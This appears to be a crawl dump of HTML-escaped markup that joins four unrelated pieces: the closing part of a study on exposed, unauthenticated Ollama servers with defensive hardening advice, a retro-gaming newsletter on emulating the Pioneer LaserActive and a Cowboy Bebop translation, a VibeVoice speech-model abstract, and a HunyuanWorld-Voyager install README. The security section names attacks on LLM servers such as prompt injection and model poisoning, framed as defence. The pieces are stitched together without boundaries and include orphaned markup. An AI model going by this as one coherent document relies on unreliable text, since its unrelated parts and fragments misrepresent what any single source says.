    &lt;p&gt;The most critical step in mitigating unauthorized access is the implementation of robust authentication mechanisms. Ollama instances, and LLM servers in general, should never be publicly exposed without requiring secure API key-based or token-based authentication. Preferably, authentication should be tied to role-based access control (RBAC) systems to limit the scope of what users can do once authenticated.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Enforce API key or OAuth2-based authentication&lt;/item&gt;
      &lt;item&gt;Tools/References: OAuth 2.0 Framework OWASP API Security Top 10&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Network Segmentation and Firewalling&lt;/head&gt;
    &lt;p&gt;Publicly exposing inference endpoints over the internet, particularly on default ports, dramatically increases the likelihood of being indexed by services like Shodan. LLM endpoints should be deployed behind network-level access controls, such as firewalls, VPCs, or reverse proxies, and restricted to trusted IP ranges or VPNs.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Use security groups, firewalls, and private subnets to isolate LLM services&lt;/item&gt;
      &lt;item&gt;Tools/References: AWS Security Best Practices, Zero Trust Architecture&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Rate Limiting and Abuse Detection&lt;/head&gt;
    &lt;p&gt;To prevent automated abuse and model probing, inference endpoints should implement rate limiting, throttling, and logging mechanisms. This can hinder brute-force attacks, prompt injection attempts, or resource hijacking.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Integrate API gateways (e.g., Kong, Amazon API Gateway) to enforce limits and monitor anomalous behavior&lt;/item&gt;
      &lt;item&gt;Tools/References: OWASP Rate Limiting Guide, Grafana for Monitoring&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Disable Default Ports and Obfuscate Service Banners&lt;/head&gt;
    &lt;p&gt;Default ports (e.g., 11434 for Ollama) make fingerprinting trivial. To complicate scanning efforts, operators should consider changing default ports and disabling verbose service banners in HTTP responses or headers (e.g., removing “uvicorn” or “Ollama” identifiers).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Modify default configurations to suppress identifiable metadata&lt;/item&gt;
      &lt;item&gt;Tools/References: Nginx reverse proxy configuration, systemd hardening&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Secure Model Upload and Execution Pipelines&lt;/head&gt;
    &lt;p&gt;Ollama and similar tools support dynamic model uploads, which, if unsecured, present a vector for model poisoning or backdoor injection. Model upload functionality should be restricted, authenticated, and ideally audited. All models should be validated against a hash or verified origin before execution.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Use content whitelisting, digital signatures, or harsh verification for uploaded models&lt;/item&gt;
      &lt;item&gt;Tools/References: Model Card Toolkit, Secure Supply Chain principles from SLSA&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Continuous Monitoring and Automated Exposure Audits&lt;/head&gt;
    &lt;p&gt;Operators should implement continuous monitoring tools that alert when LLM endpoints become publicly accessible, misconfigured, or lack authentication. Scheduled Shodan queries or custom scanners can help detect regressions in deployment security.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Use automated tools like Project Discovery’s naabu, or write custom Shodan monitoring scripts&lt;/item&gt;
      &lt;item&gt;Tools/References: Project Discovery Tools, Shodan Alert API&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;This study reveals a concerning landscape of insecure large language model deployments, with a particular focus on Ollama-based servers exposed to the public internet. Through the use of Shodan and a purpose-built detection tool, we identified over 1,100 unauthenticated LLM servers, a substantial proportion of which were actively hosting vulnerable models. These findings highlight a widespread neglect of fundamental security practices such as access control, authentication, and network isolation in the deployment of AI systems.&lt;/p&gt;
    &lt;p&gt;The uniform adoption of OpenAI-compatible APIs further exacerbates the issue, enabling attackers to scale exploit attempts across platforms with minimal adaptation. While only a subset of the exposed servers were found to be actively serving models, the broader risk posed by dormant yet accessible endpoints cannot be understated. Such infrastructure remains vulnerable to abuse through unauthorized model execution, prompt injection, and resource hijacking. Our work underscores the urgent need for standardized security baselines, automated auditing tools, and improved deployment guidance for LLM infrastructure.&lt;/p&gt;
    &lt;p&gt;Looking ahead, future work should explore the integration of multiple data sources, including Censys, ZoomEye, and custom Nmap-based scanners to improve discovery accuracy and reduce dependency on a single platform. Additionally, incorporating adaptive fingerprinting and active probing techniques could enhance detection capabilities in cases where servers use obfuscation or non-standard configurations. Expanding the system to identify deployments across a wider range of LLM hosting frameworks, such as Hugging Face, Triton, and vLLM, would further increase coverage and relevance. Finally, non-standard port detection and adversarial prompt analysis offer promising avenues for refining the system’s ability to detect and characterize hidden or evasive LLM deployments in real-world environments.&lt;/p&gt;

    &lt;head rend="h1"&gt;"This is the first:" The 16 year odyssey of "time, money, wrong turns and frustration" it took to finally emulate the Pioneer LaserActive&lt;/head&gt;
    &lt;p&gt;In April 2009, a Sega fan decided to look into emulating the Mega LD, a quirky and little-known hybrid of Genesis and LaserDisc. This week he finished the job.&lt;/p&gt;
    &lt;p&gt;Hey there ROM readers! I've got an absolute whopper of a story this issue with a genuine longform dive into the emulation of the LaserActive, plus a bit of backstory on the new fan translation of the Cowboy Bebop game for PS2, plus your usual quick hits on emulator improvements, FPGA happenings and other fan translation progress. That means there's absolutely no more time or space to waste on this intro.&lt;/p&gt;
    &lt;p&gt;LET'S GET TO IT.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Big Two&lt;/head&gt;
    &lt;head rend="h3"&gt;1. The LaserActive "might be the last vintage home console of note which hadn't been emulated," but no longer&lt;/head&gt;
    &lt;p&gt;The story behind the birth of any new emulator has some common ingredients. Fearsome programming skills; hundreds or thousands of hours of thankless work; the drive to understand exactly how and why a piece of technology works. None of these things come without patience. But lifelong Sega fan Nemesis, who released the first-ever emulator for the Pioneer LaserActive this week — 16 years after first pondering the idea — had no choice but to be patient. Because for most of the last decade, emulating the LaserActive was simply impossible.&lt;/p&gt;
    &lt;p&gt;"All along the way, the video made things difficult," he says. "The hardware to capture the signal properly didn’t exist. The software to decode the captured signal properly didn’t exist. And finally, a format to store the decoded video in a form suitable for emulation, also didn’t exist."&lt;/p&gt;
    &lt;p&gt;There's no other game console quite like the Pioneer LaserActive, which was released in 1993, sold abysmally and was dead in the ground by 1996. That's not a unique story for a '90s game system, but the LaserActive kinda... wasn't one. It was a LaserDisc player with an expansion bay that owners could slot different modules into. One transformed the LaserActive into a karaoke machine. Another would give it the guts of a PC Engine. And a third added the brains of a Sega Genesis/Mega Drive, able to play Sega CD games as well as about two dozen made for the short-lived Mega LD.&lt;/p&gt;
    &lt;p&gt;The Mega LD format represented a technological leap over early LaserDisc-based arcade games like Dragon's Lair. The mid-'90s promise of FULL MOTION VIDEO GAMEPLAY may be quaint as hell today, but it's the reason the LaserActive has been impossible to emulate for 30 years. And it still would be today, if Nemesis hadn't spent much of the 21st century proactively collecting Sega hardware and Mega LD games with the goal of one day preserving them.&lt;/p&gt;
    &lt;p&gt;Nemesis's history with both games and emulation started with the Genesis (which I will refer to as the Mega Drive for the rest of this issue, out of respect for his native Australia). After owning a Mega Drive, 32X and Mega CD growing up, he played his first emulator, the Nesticle successor Genecyst, on a Pentium 133 circa 1997. That eventually led to contributing to reverse-engineering and emulation efforts.&lt;/p&gt;
    &lt;p&gt;"I did a lot of work on the YM2612 FM chip in the Mega Drive back in 2008 in particular, and a lot of Mega Drive emulators finally had decent FM sound after that as a result," he says. "Sharing that research, seeing the results made use of, and finally hearing the games I remembered from my childhood sound right for the first time, was a really good feeling."&lt;/p&gt;
    &lt;p&gt;In 2004, when buying loads of retro consoles was not yet a universal pasttime for nostalgic millenials and Gen Xers, he paid about $200 for one of the approximately 10,000 LaserActives that Pioneer manufactured in its short life, along with the Mega LD "PAC" module. Throughout the rest of the decade he scooped up every bit of Sega hardware he could get his hands on with an eye towards future reverse-engineering projects, but it wasn't until 2009 when he started thinking: Why isn't there an emulator for the LaserActive?&lt;/p&gt;
    &lt;p&gt;So he did what any retro game fan would do in 2009: started a forum thread about it.&lt;/p&gt;
    &lt;p&gt;"This system keeps popping into my mind," he wrote in the thread, which is still online today. "I don't think anyone's had a serious crack at emulating it yet, and I really don't think it would be very hard to do."&lt;/p&gt;
    &lt;p&gt;Well. About that.&lt;/p&gt;
    &lt;p&gt;"I honestly feel like I've nearly 'solved' this system half a dozen times over by now," Nemesis says here in 2025.&lt;/p&gt;
    &lt;p&gt;"The digital side of the system was actually pretty straightforward. When you break it down, the LaserActive is really more like a big oversized add-on to the console hardware. What that add-on provides is a different drive control interface, another audio source, and another video source, with mixing features to combine that video/audio with the console video/audio. That's really about it. On paper, it's pretty simple. In reality though, the LaserActive hardware did present a lot of challenges, mostly due to its inherent unreliability."&lt;/p&gt;
    &lt;p&gt;With prior experience writing a Genesis emulator of his own, Nemesis originally thought he'd be well-positioned to tackle the LaserActive. But the problem started to pile up immediately. First there were the almost 100 capacitors in the Sega PAC that were guaranteed to fail at some point, causing many to have to be replaced on even a mint condition system. Pioneer's cost-cutting inside the LaserDisc player caused other parts to break, too. Learning to fix the LaserActive was a necessary step to figuring out how it worked.&lt;/p&gt;
    &lt;p&gt;2011 was a year of progress. Nemesis:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Coded a program to load onto a Mega Drive flash cart that allowed him to "probe" the LaserActive hardware&lt;/item&gt;
      &lt;item&gt;Disassembled the system BIOS to identify that "ll the interaction with the LaserActive hardware happened over a custom register block"&lt;/item&gt;
      &lt;item&gt;Coded another program that allowed direct read/write access to those registers using a controller&lt;/item&gt;
      &lt;item&gt;With the help of other forumites, mapped most of the registers by comparing the system's actions to the code in the disassembldd BIOS and documented what it was doing&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The next two years were focused on figuring out how to rip the LaserActive's games. This involved writing multiple more custom programs and using a special USB-to-MD link cable to copy the digital data from the disc, which contained the game code as well as audio tracks. When that didn't prove to be enough to capture the TOC (or table of contents) data that essentially acted as a guide to how all the data on the disc was organized, he had to go deeper.&lt;/p&gt;
    &lt;p&gt;"I soldered a bunch of physical tapping wires into my Sega PAC-S10 module, and used a Saleae logic analyzer clone to do a streaming capture of the data lines when the TOC region was being read, which the hardware didn't make directly available. I wrote a program to parse the bus trace and extract the data from the raw capture and reconstruct the lead-in. At this point, I had everything I needed to rip a full bin/cue image of the digital data from a LaserDisc."&lt;/p&gt;
    &lt;p&gt;In 2014, Nemesis started soliciting other members of the forum where he chronicled the project to send him Mega LD games to dump (shout out to doc eggfan, who acquired most of the library including two Myst prototypes; "if he hadn't done that, there's a good chance they would have been lost forever). With a pile of games in hand, he bought a PC video capture card to rip the audio and video from the discs. And this is where the 2-3 people reading this who have an intimate understanding of the LaserActive will probably reflexively say "uh oh."&lt;/p&gt;
    &lt;p&gt;LaserDisc, despite looking like a jumbo DVD, is an analog video medium. No big deal if you're just capturing a movie. But for a game? Big big deal. Here's the long-form breakdown — skip ahead if you don't want to get way deep into analog-to-digital misery.&lt;/p&gt;
    &lt;quote&gt;"No analog capture cards of the day were actually up to the task of what we were trying to do. ... The LaserActive has one of the fastest, most powerful control systems for LaserDisc playback ever made, and the game has direct, immediate control over it. Rarely is the player just playing back a video normally. Games will often have completely different video footage per field, with only one shown, or skip over every second frame, to mix four or more video streams in the same area of the disc. Many games use this for seamless 'branching' such as whether you go left or right, and this can change constantly and seamlessly during playback. The unit can play faster or slower, even playing in reverse, such as in Rocket Coaster as you speed up, or slide backwards down a slope. The unit can perform rapid nearly instant seeks with seamless looping, and does for games like Myst. In fact, the entire Myst title is basically using the LaserDisc as a set of random, short transitions, and still images, and other titles do this as well to differing degrees. ...&lt;lb/&gt;Games used the skip play features to further interleave different video streams at half the framerate between each other. Analog capture cards of the day didn't deal with this well. None of them could compress lossless video, everything was encoded to lossy formats. Most of them would assume a 480i image. This would cause the separate video streams in each field to 'bleed into' each other, destroying the image. The same problem occurred between frames when they had separate video streams interleaved together, where inter-frame compression would cause artifacts from the two streams to bleed together.&lt;lb/&gt;A high end Canopus capture card I had was the only one that was capable of compressing into huffyuv, not in a lossless form, but at least in a format that prevented this bleeding problem. Unfortunately, this card still had a limitation, in that it couldn't capture the VBI data. It was common in the day for special 'control codes' to be encoded into lines normally hidden on a normal TV, which contained information. In the case of LaserDiscs, it contained frame numbers, timecodes, picture stop codes, video TOC information in the lead-in, and other such data. None of that could be captured by capture cards of the day. For cards that had VBI capture features, they didn't work on LaserDiscs, since LaserDiscs used different lines/formats than other sources, and no capture cards in the world expected to be capturing LaserDisc video.&lt;lb/&gt;At this point, I felt like I'd hit a bit of a dead end. It could, perhaps, have been possible to cobble something together at this point in 2014, but I felt the result would be poor, and the discs would not have been properly preserved. I decided a different approach was needed for the analog video content, but the technology to do what I needed to do at this point, didn't seem to exist."&lt;/quote&gt;
    &lt;p&gt;With an increasingly busy home life thanks to two young kids, a long commute and demanding workload at the office, Nemesis did the only thing that made sense at that point. He put the LaserActive on the shelf.&lt;/p&gt;
    &lt;p&gt;Two years later, he took another stab at it by trying to build his own hardware capture setup. By tapping into the LaserActive directly, he was able to capture a full, raw composite video signal — but it was useless unless he could decode it. Back on the shelf it went for another two years.&lt;/p&gt;
    &lt;p&gt;A house move, shorter commute and more balanced work-life, er, balance, later, Nemesis decided to dust off the LaserActive. Enter the Domesday Duplicator — an open source, community-driven hardware project dedicated to ripping LaserDiscs.&lt;/p&gt;
    &lt;p&gt;Surely this was the capture solution he'd been waiting for. Turns out it was... but not in 2018. A key companion to the Domesday Duplicator, ld-decode, was then still "in its infancy." At the time there was no publicly available software solution to decoding composite video; by the time computers were fast enough to do it without dedicated hardware, analog was donezo. Nemesis went down the path of trying to write his own decoder to mixed results, but when he found out kid #4 was on the way, he decided to wait for the broader community effort to mature.&lt;/p&gt;
    &lt;p&gt;And it did mature by a lot, with both the Duplicator and ld-decode improving process of ripping LaserDiscs in the higest possible quality. But there was still a problem when it came to LaserActive discs — they were interactive games, not static films. In 2020 Nemesis started chipping in to ld-decode:&lt;/p&gt;
    &lt;quote&gt;"I started pushing for the need to add extra features into the decode process. Until then, focus had been entirely around the requirements of capturing movies on LaserDiscs, as you'd expect. LaserActive games needed more though. I needed a way to capture the full lead-in, which stored the TOC data for both the analog video and the digital data. If you're just ripping a LaserDisc to an mp4, you don't need this info, but we do for emulation. I also needed the full 525 lines of NTSC video, with VBI data. That was stripped by ld-decode, they just cared about the visible region you'd see on a TV. I needed to deal with mixed-mode 'CD' images in the digital data track. They just needed audio tracks to work. I needed to be able to play through picture stop codes seamlessly without corrupting the audio data, they didn't need to worry about that. All kinds of things like this added up, to mean that ld-decode increasingly worked great for regular LaserDiscs, but still wasn't checking all the boxes for LaserActive games."&lt;/quote&gt;
    &lt;p&gt;Before he could fully commit to adding those features himself, COVID upended everything and the LaserActive went back into storage.&lt;/p&gt;
    &lt;p&gt;2024: 15 years after he'd first suggested emulating the LaserActive didn't seem like it'd be that tricky, set up in a new house with a new workspace, Nemesis finally vowed to finish what he'd started.&lt;/p&gt;
    &lt;p&gt;It was a year of whirlwind activity:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Using the LaserActive's test mode and a custom firmware mod he developed to properly capture the lead-in and lead-out from every disc&lt;/item&gt;
      &lt;item&gt;Rewriting the flaky USB capture code for the Domesday Duplicator's capture program to ensure error-free rips&lt;/item&gt;
      &lt;item&gt;Expanding the program's capabilities to record more data about the disc itself, the player, and the signal quality&lt;/item&gt;
      &lt;item&gt;Rewriting ld-decode's digital audio decoding, which had issues with drifting out of sync with the video, and finally making it possible to parse the TOC data&lt;/item&gt;
      &lt;item&gt;Improving the video decoding to output full frame data, with all 525 lines of NTSC video and the VBI data&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;"With all these bits in place, I was now able to rip discs and extract the actual contents in a form suitable for emulation," Nemesis says. 2024 ticked over to 2025, and he began removing LaserActive games from the sleeves they'd rested within for decades undisturbed. Most of them had been bought new and never opened; for years he'd resisted the urge, not wanting to risk even a tiny accidental scratch until everything was ready.&lt;/p&gt;
    &lt;p&gt;After so many years and so many obstacles, the final mile was, at long last, an easy run:&lt;/p&gt;
    &lt;quote&gt;"Most of the work reverse engineering the hardware I'd already done and published notes on over 13 years prior. I sat down and implemented the emulation code according to my notes, double checking things on the hardware as I went using the same testing program I'd written all those years ago, and filling the gaps in my notes for parts I hadn't fully mapped out. Space Berserker was quickly running, and after that, as more games finished decoding most of them worked on the first try, with no issues. Since I'd set out to emulate the complete hardware, with all its quirks and unusual features, whatever a game tried to do, it should just work. A few games flushed out some things I'd missed here and there, but mostly it was just fixing bugs in my implementation, until after a few weeks, everything was fully working in the emulator, just the same way it did on the hardware."&lt;/quote&gt;
    &lt;p&gt;Nemesis decided to write his LaserActive emulation as a component of multi-system emualtor Ares, partially out of respect for its late creator, Near. Its existing Mega Drive support made for an easy starting point, and current Ares maintainer Luke Usher had actually done some ground work to support the Mega LD in the future by creating a "skeleton" that defined it in relation to the Mega Drive and CD.&lt;/p&gt;
    &lt;p&gt;"It was all sitting there, just needed the actual code to be written to emulate the LaserActive hardware," Nemesis says. "I'd never touched the Ares code before, but having this delivered to me is what allowed me to get the basics of drive control to have Mega CD games booting in days, from work over a few evenings. Without that, there's a good chance I wouldn't have started when I did."&lt;/p&gt;
    &lt;p&gt;There's one final wrinkle to LaserActive emulation, and that's the disc image files themselves. Basically, they're huge, in the dozens of gigabytes range. And that, again, is because the way LaserActive games utvi makes them allergic to compression. They may want to jump to specific frames in an instant, play backwards, or interleave frames, all of which means a specific moment in time needs to be a keyframe, not a compressed, modified frame that only contains the small amount of data that's changed from the frame before it, which is how video files are greatly reduced in size. You could still compress a LaserActive game to about 10GB per size with every frame preserved as a keyframe...&lt;/p&gt;
    &lt;p&gt;"That still isn’t suitable though, as heavyweight video codecs are too intensive to decode alongside emulating an entire Mega Drive + MegaCD in realtime without involving hardware decoding," Nemesis says. "In order to keep everything running at 60fps, you have to be able to do everything in under 16ms per frame. Using hardware decoding would take decoding burden off the CPU, but the video mixing with the graphics output from the Mega Drive now becomes more complex, and you also now place specific GPU requirements on any system that’s going to try and play these games."&lt;/p&gt;
    &lt;p&gt;So they stuck to a lossless format that preserves quality and takes the pressure off the CPU (and puts none at all on a graphics card). Any system that can currently run Ares should have no trouble with the LaserActive, with the caveat that you'll definitely want to have these mondo files on an SSD rather than an old spinning platter to avoid any issues with read speeds.&lt;/p&gt;
    &lt;p&gt;Ares v146, released on August 26, marked the first time a Mega LD game has been playable on another system. And it represents a milestone in game preservation that could've easily been missed — due to indifference, the literal string of inventions it took to make it a reality, or the inexorable march of time.&lt;/p&gt;
    &lt;p&gt;"There are other titles I don’t have access to at all, however I’m in discussions with a number of people who have offered to loan discs to help complete the dumping efforts," Nemesis says. "It’s been great to see people step up and offer to help. It’s vital this is done now, because Laserdisc titles don’t last forever. I have one disc in my possession that was a new, sealed copy, pressed in 1994, which is suffering from laser-rot. It’s likely that eventually, all Laserdiscs will be rendered unplayable, so we need to ensure these games are preserved now, while we still can."&lt;/p&gt;
    &lt;p&gt;He's now looking into the prospect of preserving the PC Engine PAC, which will — fingers crossed — not be too much more complicated than plugging Ares' existing PC Engine CD code into the new LaserActive code. But that's a story for another day.&lt;/p&gt;
    &lt;p&gt;For now, the emulation code being out in the wild represents relief most of all. "It was a long journey, with a lot of false starts and wrong turns getting to that point," Nemesis says. "A lot of it was work and time which nobody else had been able to see. I don't keep a blog. I don't tend to share the various steps I take to make something or get something working, I only tend to reach out when I have something to share or when I'm asking for help from other people.&lt;/p&gt;
    &lt;p&gt;"A lot of my time and energy had gone into this system over the years, and it was good to finally be able to show something for all that work."&lt;/p&gt;
    &lt;head rend="h3"&gt;2. Let's kick the beat: a Cowboy Bebop video game in English at long last&lt;/head&gt;
    &lt;p&gt;If there was any anime game you'd think had a sure shot at being released in English in the early 2000s, how could it be anything but Cowboy Bebop? The breakthrough "not every anime is Dragon Ball Z" series was a huge hit on Cartoon Network, channeled the American jazz of Art Blakey, and even saw a then-rare theatrical run for its movie spin-off. But neither its PlayStation 1 or PlayStation 2 games ever made it out of Japan.&lt;/p&gt;
    &lt;p&gt;*Hard bop drum roll*&lt;/p&gt;
    &lt;p&gt;...Until now! I'm delighted that translator Sonicman69, along with an anonymous hacker, has brought the PS2 beat 'em up Cowboy Bebop: Tsuioku no Serenade to English players to celebrate the game's 20th anniversary. Regular ROM readers may remember Sonicman69's translation of a Detective Conan PlayStation 2 game featured last year, both prime examples of a period when games based on popular anime were still far from a sure thing localization-wise.&lt;/p&gt;
    &lt;p&gt;Well, for Conan that may unfortunately still be the case, as I don't know if the boy-sized genius has ever really made it in America. But I'm pretty sure a Cowboy Bebop game released in 2025 would be targeting English-speaking audiences even before Japanese ones. As I theorized earlier this week on PC Gamer, Tsuioku no Serenade's developer Bandai merging with Namco right around the time this game was being released may be the culprit — the ensuing corporate chaos of layoffs and reorganizations could easily have killed it in the cradle.&lt;/p&gt;
    &lt;p&gt;I haven't had a chance to play Tsuioku no Serenade myself despite being lucky enough to track down a (seemingly somewhat rare, now) copy, but general consensus is it's an okay brawler but quite a nice little Bebop sidestory with some handsome late-era PS2 graphics. And there's original Yoko Kanno music, so, like, what else do you really want?&lt;/p&gt;
    &lt;p&gt;I reached out to translator Sonicman69 for a bit of insight into the translation effort, who first watched Bebop around 2014 and learned later that the game had never been released in English. "From that exact moment I felt like I could be the one to do it," he said. "Keep in mind at this time I knew maybe three words in Japanese and was still in high school. Big expectations. I figured someone else would get around to it eventually."&lt;/p&gt;
    &lt;p&gt;But they didn't, so after off-and-on attempts to learn Japanese and gaining some translation and editing experience contributing to the Conan patch, he set sights on Bebop with the aim of finishing the patch by the game's 20th anniversary:&lt;/p&gt;
    &lt;quote&gt;I'd say the most challenging thing that people don't really think about is how often text would be reused at different points in the game. Trying to figure out a translation for a sentence that works in one context that also has to work in another — Conan had this a little bit but it was a lot more annoying with Bebop and frankly I don't think I nailed it. Aside from that the interstitials between scenes are poetic and I'm still a Japanese novice and have no poetic ability at all so I had a tough time at those and I think they came out kind of bad.&lt;lb/&gt;I am admittedly a little apologetic about the quality of the translation, I've received unanimous praise so far but I know I could have done better if I studied more but if I didn't translate the game now it would have never happened at all. What I'm most proud of aside from the fact we actually got it done and released it in time for the 20th anniversary? People keep telling me I did a good job writing the lines for the characters in a way that stays true to how they talked in the English dub of the show. I'm hesitant to accept that since I'm pretty critical of it myself but if I really was able to capture the characters then I did my job."&lt;/quote&gt;
    &lt;p&gt;Sonicman69 also argues that the game is "not a simple button mashing beat 'em up due to how deep the combat actually is," but some annoying tutorials and the language barrier made it easy to write off. Take it from the person who's beaten it a dozen times: it's worth playing. "As far as how well the story captures the vibe of the show I think they did a pretty admirable job, but obviously it's never going to get anywhere near the best scenes from the show. Any Bebop fan who wishes there was just a little bit more to chew on should at least enjoy the game a little bit. Especially the bonus mode you unlock after completing the game on normal but I don't want to spoil too much."&lt;/p&gt;
    &lt;p&gt;You can find the English patch on Github and throw a few bucks to Sonicman69 on Ko-fi if you appreciate getting to spend a little more time in the Bebopverse after all these years.&lt;/p&gt;
    &lt;head rend="h2"&gt;Patching In&lt;/head&gt;
    &lt;p&gt;Sometimes emudev is all about fixing a texture issue in Colin McRae Rally 2005 – I always try to look into random Github commits with names I don't understand to see what they're all about, and sometimes PCSX2 being update to "Handle texture shuffle with pixel reversals" is just about adding some code to ignore when a game is flipping pixels horizontally and then flipping them back again because it screwed things up. Specifically it screwed up the roads in Colin McRae Rally 2005, and seemingly only Colin McRae Rally 2005.&lt;/p&gt;
    &lt;p&gt;bsnes updated with latest version of SameBoy – I think it's wonderful that Near's Super Nintendo emulator is still being maintained, and this is a nice update. bsnes uses an integrated version of SameBoy for accurate Super Game Boy emulation, but it was out of date with that emulator's continued development. No longer! All synced up.&lt;/p&gt;
    &lt;p&gt;Deeply customizable PC emulator 86Box hits 5.0 – If you want to create a virtual PC down to the motherboard, sound card, and BIOS you had on the family PC back in like 1996, 86Box is your jam. And it's just gotten its first meaty release since September 2024, with version 5.0 including a lengthy list of additions and fixes plus "a preview for one of the most requested 86Box features of all time: an integrated machine manager to organize all your emulated setups." Other highlights: "much smoother" mouse input and display output on high refresh monitors; support for CRT emulation shader effects; new systems including some early Japanese PC-compatibles; and dark mode support on Windows.&lt;/p&gt;
    &lt;head rend="h2"&gt;Core Report&lt;/head&gt;
    &lt;p&gt;Call me Mr. Turbo CD + Graphics – The MiSTer's PC Engine / Turbografx core just got a notable update with work from contributor David Shadoff that's been gestating for the last few months: support for CD+G, "a special audio CD that contains graphics data in addition to the audio data on the disc," according to Sega Retro. "The disc can be played on a regular audio CD player, but when played on a special CD+G player, can also output a graphics signal. CD+G is most commonly seen used for karaoke and slideshows."&lt;/p&gt;
    &lt;p&gt;The MiSTer's Commodore 64 core now also notably supports writing to Easyflash carts and "Waterloo Structured BASIC and BMP-Data Turbo 2000."&lt;/p&gt;
    &lt;p&gt;Surprise! (Attack) – Jotego dropped a core for this Konami arcade sidescroller for MiSTer and Analogue Pocket this week, along with a bit of deserved braggadocio about nailing some specific graphic effects that aren't correctly emulated in MAME. Sweat those details! Also, I'd just like to point out that Surprise Attack has some absolutely sick flyer artwork.&lt;/p&gt;
    &lt;head rend="h2"&gt;Translation Station&lt;/head&gt;
    &lt;p&gt;Sword &amp;amp; Sorcery &amp;amp; English – You might think Bebop would be a big enough deal that the Translation Station could take the rest of the week off, but nope — trains are still runnin'! Hit the link for a making-of at great fansite Sega Saturn Shiro from one of the contributors to this project for the 1996 JRPG. Note that it's an in-progress patch, rather than a finished one you'll want to leap to play right now; this is more of a "get excited" mention (and a fun read) which I'll no doubt circle back to in the future.&lt;/p&gt;
    &lt;p&gt;Psychic Killer, Fa-fa-fa-fa, fa-fa-fa-fa – It's a Shiro two-fer this week! This translation of Psychic Killer Taromaru is a 1.0 you can grab on Github and was cranked out in just a month using Saturn emulator Yaba Sanshiro. It's a sidescrilling action game in which you, a ninja, "fire psychic energy at demons to save a kidnapped girl in feudal Japan," says Shiro. The translation was inspired by this video from Dungeon Chill, who called it a hidden gem. Well, it ain't hidden anymore. You can see it right here. Not very subtle, ninja.&lt;/p&gt;
    &lt;p&gt;If you ever wanted to play Clock Tower on the WonderSwan... – Then here's a translation for you. This patch ports the Aeon Genesis team's translation over to the WonderSwan release of the original Super Nintendo horror game. Maybe it's scarier in low-res black and white?&lt;/p&gt;

    &lt;p&gt;VibeVoice is a novel framework designed for generating expressive, long-form, multi-speaker conversational audio, such as podcasts, from text. It addresses significant challenges in traditional Text-to-Speech (TTS) systems, particularly in scalability, speaker consistency, and natural turn-taking. A core innovation of VibeVoice is its use of continuous speech tokenizers (Acoustic and Semantic) operating at an ultra-low frame rate of 7.5 Hz. These tokenizers efficiently preserve audio fidelity while significantly boosting computational efficiency for processing long sequences. VibeVoice employs a next-token diffusion framework, leveraging a Large Language Model (LLM) to understand textual context and dialogue flow, and a diffusion head to generate high-fidelity acoustic details. The model can synthesize speech up to 90 minutes long with up to 4 distinct speakers, surpassing the typical 1-2 speaker limits of many prior models.&lt;/p&gt;
    &lt;p&gt;* Timestamps are derived from the generated audio and may contain errors.&lt;/p&gt;

    &lt;p&gt;We introduce HunyuanWorld-Voyager, a novel video diffusion framework that generates world-consistent 3D point-cloud sequences from a single image with user-defined camera path. Voyager can generate 3D-consistent scene videos for world exploration following custom camera trajectories. It can also generate aligned depth and RGB video for efficient and direct 3D reconstruction.&lt;/p&gt;

      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Voyager consists of two key components:&lt;/p&gt;
    &lt;p&gt;(1) World-Consistent Video Diffusion: A unified architecture that jointly generates aligned RGB and depth video sequences, conditioned on existing world observation to ensure global coherence.&lt;/p&gt;
    &lt;p&gt;(2) Long-Range World Exploration: An efficient world cache with point culling and an auto-regressive inference with smooth video sampling for iterative scene extension with context-aware consistency.&lt;/p&gt;
    &lt;p&gt;To train Voyager, we propose a scalable data engine, i.e., a video reconstruction pipeline that automates camera pose estimation and metric depth prediction for arbitrary videos, enabling large-scale, diverse training data curation without manual 3D annotations. Using this pipeline, we compile a dataset of over 100,000 video clips, combining real-world captures and synthetic Unreal Engine renders.&lt;/p&gt;

      &lt;item&gt;An NVIDIA GPU with CUDA support is required. &lt;list rend="ul"&gt;&lt;item&gt;The model is tested on a single 80G GPU.&lt;/item&gt;&lt;item&gt;Minimum: The minimum GPU memory required is 60GB for 540p.&lt;/item&gt;&lt;item&gt;Recommended: We recommend using a GPU with 80GB of memory for better generation quality.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Tested operating system: Linux&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Begin by cloning the repository:&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/Tencent-Hunyuan/HunyuanWorld-Voyager
cd HunyuanWorld-Voyager&lt;/code&gt;
    &lt;p&gt;We recommend CUDA versions 12.4 or 11.8 for the manual installation.&lt;/p&gt;
    &lt;code&gt;# 1. Create conda environment
conda create -n voyager python==3.11.9

# 2. Activate the environment
conda activate voyager

# 3. Install PyTorch and other dependencies using conda
# For CUDA 12.4
conda install pytorch==2.4.0 torchvision==0.19.0 torchaudio==2.4.0 pytorch-cuda=12.4 -c pytorch -c nvidia

# 4. Install pip dependencies
python -m pip install -r requirements.txt
python -m pip install transformers==4.39.3

# 5. Install flash attention v2 for acceleration (requires CUDA 11.8 or above)
python -m pip install flash-attn

# 6. Install xDiT for parallel inference (It is recommended to use torch 2.4.0 and flash-attn 2.6.3)
python -m pip install xfuser==0.4.2&lt;/code&gt;
